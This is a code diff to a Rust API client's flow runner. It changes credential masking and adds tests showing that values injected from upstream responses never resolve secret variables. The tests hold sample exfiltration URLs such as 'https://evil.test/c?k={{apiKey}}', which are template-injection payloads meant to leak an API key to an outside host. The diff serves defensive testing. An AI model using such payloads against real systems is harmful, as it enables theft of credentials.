@@ -2020,7 +2020,9 @@ impl FlowExecutionService {
 /// Resolved with the same variables `resolve_request` uses for this request
 /// (global < collection < environment < folder < request, plus vault values
 /// and flow variables), read now, just before the send. `None` for a literal
-/// or non-token credential, or when a placeholder stays unresolved. In that
+/// or non-token credential, for a fetched or supplied token (the send does not
+/// resolve it, and it is already one of the run's secrets), or when a
+/// placeholder stays unresolved. In that
 /// last case the request still sends the partly resolved text, so with
 /// `{{token}}-{{unset}}` the resolved `token` part goes out unmasked unless
 /// another path (e.g. a secret variable) masks it.
@@ -2029,11 +2031,18 @@ fn send_time_credential_value(
     request_input: &ExecuteRequestInput,
     external_secrets: &HashMap<String, String>,
 ) -> Option<String> {
+    if request_input.literal.auth {
+        return None;
+    }
     let template = crate::flow_auth::credential_template(&request_input.auth)?;
-    // The send resolves `{{process.env.NAME}}` in the credential too, unless a token
-    // response filled it, so the mask matches what is sent.
-    let host_env = request_input.backend_process_env && !request_input.literal.auth;
-    let vars = send_vars(exec, request_input, external_secrets, host_env);
+    // The send resolves `{{process.env.NAME}}` in the credential too, so the mask
+    // matches what is sent.
+    let vars = send_vars(
+        exec,
+        request_input,
+        external_secrets,
+        request_input.backend_process_env,
+    );
     crate::flow_auth::resolve_fully(template, &vars).filter(|value| !value.is_empty())
 }
 
@@ -10300,14 +10309,29 @@ mod tests {
 
     /// An exec whose trust gate allows the host environment, sending through `executor`.
     fn host_env_exec(executor: &Arc<RecordingExecutor>) -> RequestExecutionService {
+        exec_with_collection(executor, rocket_collection::Collection::new("my-api"))
+    }
+
+    /// `host_env_exec`, but the collection holds the variable `apiKey = "k-123"`.
+    fn secret_var_exec(executor: &Arc<RecordingExecutor>) -> RequestExecutionService {
+        let mut collection = rocket_collection::Collection::new("my-api");
+        collection
+            .settings
+            .variables
+            .push(collection_var("apiKey", "k-123"));
+        exec_with_collection(executor, collection)
+    }
+
+    fn exec_with_collection(
+        executor: &Arc<RecordingExecutor>,
+        collection: rocket_collection::Collection,
+    ) -> RequestExecutionService {
         RequestExecutionService::new(
             Box::new(NullEnvRepo),
             Arc::new(SharedExecutor(Arc::clone(executor))),
             Box::new(NullHistoryRepo),
             Box::new(crate::test_doubles::SharedCollectionRepo(
-                crate::test_doubles::InMemoryCollectionRepo::new(
-                    rocket_collection::Collection::new("my-api"),
-                ),
+                crate::test_doubles::InMemoryCollectionRepo::new(collection),
             )),
             Box::new(NullCookieRepo),
             Box::new(NullEventPublisher),
@@ -10363,6 +10387,137 @@ mod tests {
             .find(|h| h.key == "X-Wired")
             .map(|h| h.value.clone());
         assert_eq!(wired.as_deref(), Some(attack));
+    }
+
+    #[tokio::test]
+    async fn wired_values_never_resolve_collection_variables() {
+        let attack = "https://evil.test/c?k={{apiKey}}";
+        let flow = Flow {
+            name: "wired".to_string(),
+            nodes: vec![
+                request_flow_node("a", "https://api.example.com/a"),
+                allow_wired_host(request_flow_node("b", "https://api.example.com/b")),
+                request_flow_node("c", "https://api.example.com/c?k={{apiKey}}"),
+            ],
+            edges: vec![
+                wire("e1", "a", "b"),
+                FlowEdge {
+                    target_field: "headers[X-Wired].value".to_string(),
+                    ..wire("e2", "a", "b")
+                },
+            ],
+            callback_host: None,
+        };
+        let executor = RecordingExecutor::new();
+        executor.set_body("api.example.com/a", attack);
+        let exec = secret_var_exec(&executor);
+        let service = FlowExecutionService::new(
+            Box::new(FakeFlowRepository::new().with_flow("my-api", flow)),
+            Box::new(FakeCollectionRepo::new().build()),
+            Box::new(NullEventPublisher),
+        );
+
+        service.run(&exec, run_input("wired")).await.expect("run");
+
+        let urls = executor.sent_urls();
+        assert!(urls.contains(&attack.to_string()), "{urls:?}");
+        // Text from the saved request still resolves.
+        assert!(
+            urls.contains(&"https://api.example.com/c?k=k-123".to_string()),
+            "{urls:?}"
+        );
+        let index = urls.iter().position(|u| u == attack).expect("b was sent");
+        let wired = executor.sent_headers()[index]
+            .iter()
+            .find(|h| h.key == "X-Wired")
+            .map(|h| h.value.clone());
+        assert_eq!(wired.as_deref(), Some(attack));
+    }
+
+    #[tokio::test]
+    async fn a_script_variable_never_fills_a_wired_value() {
+        let attack = "https://evil.test/{{apiKey}}";
+        let flow = Flow {
+            name: "wired".to_string(),
+            nodes: vec![
+                request_flow_node("a", "https://api.example.com/a"),
+                allow_wired_host(saved_flow_node("b", "req.yml")),
+            ],
+            edges: vec![wire("e1", "a", "b")],
+            callback_host: None,
+        };
+        let mut saved = Request::new("B", HttpMethod::Get, "https://api.example.com/b");
+        saved.pre_request_script = Some("rok.setVar('apiKey', 'from-script');".into());
+        let executor = RecordingExecutor::new();
+        executor.set_body("api.example.com/a", attack);
+        let exec = host_env_exec(&executor);
+        let service = FlowExecutionService::new(
+            Box::new(FakeFlowRepository::new().with_flow("my-api", flow)),
+            Box::new(
+                FakeCollectionRepo::new()
+                    .with_request("my-api", "req.yml", saved)
+                    .build(),
+            ),
+            Box::new(NullEventPublisher),
+        );
+
+        let summary = service.run(&exec, run_input("wired")).await.expect("run");
+
+        let b = summary
+            .steps
+            .iter()
+            .find(|s| s.node_id == "b")
+            .expect("b ran");
+        assert_eq!(b.error, None);
+        assert_eq!(
+            executor.sent_urls().last().map(String::as_str),
+            Some(attack)
+        );
+    }
+
+    #[tokio::test]
+    async fn a_fetched_token_is_sent_without_resolving_any_scope() {
+        use rocket_shared::types::Auth;
+
+        let executor = RecordingExecutor::new();
+        let exec = secret_var_exec(&executor);
+        let service = fetched_token_service(Auth::Inherit, Vec::new(), "{{apiKey}}");
+
+        service
+            .run(&exec, run_input("auth-req"))
+            .await
+            .expect("run");
+
+        assert_eq!(
+            executor.sent_auths(),
+            vec![Auth::Bearer {
+                token: "{{apiKey}}".to_string()
+            }]
+        );
+    }
+
+    #[test]
+    fn send_time_credential_value_is_none_for_a_literal_auth() {
+        use rocket_shared::types::Auth;
+
+        let executor = RecordingExecutor::new();
+        let exec = secret_var_exec(&executor);
+        let mut input = sample_execute_input();
+        input.collection = Some("my-api".to_string());
+        input.auth = Auth::Bearer {
+            token: "{{apiKey}}".to_string(),
+        };
+        input.literal.auth = true;
+        assert_eq!(
+            send_time_credential_value(&exec, &input, &HashMap::new()),
+            None
+        );
+
+        input.literal.auth = false;
+        assert_eq!(
+            send_time_credential_value(&exec, &input, &HashMap::new()).as_deref(),
+            Some("k-123")
+        );
     }
 
     /// `node` with `allow_wired_host` on, for a test that wires a URL to another host.
@@ -10507,6 +10662,7 @@ mod tests {
     fn fetched_token_service(
         request_auth: rocket_shared::types::Auth,
         edges: Vec<FlowEdge>,
+        token: &str,
     ) -> FlowExecutionService {
         use crate::flow_auth::test_support::{FakeFetcher, SharedFetcher};
 
@@ -10534,9 +10690,7 @@ mod tests {
             ),
             Box::new(NullEventPublisher),
         )
-        .with_token_fetcher(Box::new(SharedFetcher(FakeFetcher::ok(
-            "{{process.env.PATH}}",
-        ))))
+        .with_token_fetcher(Box::new(SharedFetcher(FakeFetcher::ok(token))))
     }
 
     #[tokio::test]
@@ -10545,7 +10699,7 @@ mod tests {
 
         let executor = RecordingExecutor::new();
         let exec = host_env_exec(&executor);
-        let service = fetched_token_service(Auth::Inherit, Vec::new());
+        let service = fetched_token_service(Auth::Inherit, Vec::new(), "{{process.env.PATH}}");
 
         service
             .run(&exec, run_input("auth-req"))
@@ -10572,6 +10726,7 @@ mod tests {
                 password: "own".to_string(),
             },
             vec![auth_wire()],
+            "{{process.env.PATH}}",
         );
 
         service
